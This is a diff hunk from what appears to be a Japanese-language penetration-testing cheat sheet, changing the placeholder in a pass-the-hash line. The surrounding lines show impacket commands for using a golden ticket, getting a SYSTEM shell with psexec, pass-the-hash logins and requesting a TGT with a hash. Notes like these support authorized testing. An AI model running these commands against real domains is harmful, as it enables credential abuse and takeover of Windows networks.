@@ -28,7 +28,7 @@ export KRB5CCNAME=./Administrator.ccache #上記で生成したゴールデン�
 
 impakcet-psexec -k -no-pass <domain> #ゴールデンチケットを持っている場合systemのシェルを使える
 impacket-psexec <domain>/<user>:<pass>@<IP> #impacket版psexec　パスを知っている場合
-impacket-psexec Administrator@<IP> -hashes '<ntlm:hash>' #パスザハッシュ
+impacket-psexec Administrator@<IP> -hashes 'hash:hash' #パスザハッシュ
 
 impacket-getTGT <domain>/'<user>' -hashes :<hash> -dc-ip dc01.example.local #TGTの発行
 
